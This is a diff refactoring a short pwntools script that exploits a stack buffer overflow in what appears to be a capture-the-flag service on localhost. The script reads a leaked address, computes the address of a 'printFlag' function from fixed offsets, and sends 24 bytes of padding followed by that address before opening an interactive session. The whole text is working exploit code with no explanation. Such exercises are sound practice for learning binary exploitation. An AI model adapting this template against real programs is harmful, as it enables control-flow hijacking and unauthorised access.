@@ -8,22 +8,25 @@ from pwn import *
 host="localhost"
 port=1342
 
-p = remote(host, port)
+process = remote(host, port)
 
 start_offset = 0x00000000000012da
 printFlag_offset = 0x0000000000001255
 
-given_start_address = p.recv().decode().split('\n')[-3].split('0x')[-1]
+address_sentence = process.recv().decode().split('\n')[-3]
+given_start_address = address_sentence.split('0x')[-1]
+
 printFlag_address = int(given_start_address,16) - start_offset + printFlag_offset
-log.info('Address of start: 0x{}'.format(given_start_address))
-log.info('Address of printFlag: {}'.format(hex(printFlag_address)))
+
+buffer_size = 24
 
 payload = [
-    b'A' * 24,
+    b'A' * buffer_size,
     p64(printFlag_address)
 ]
 
-payload = b"".join(payload)
-log.info('Sending Payload...')
-p.sendline(payload)
-p.interactive()
+payload = b''.join(payload)
+
+process.sendline(payload)
+
+process.interactive()
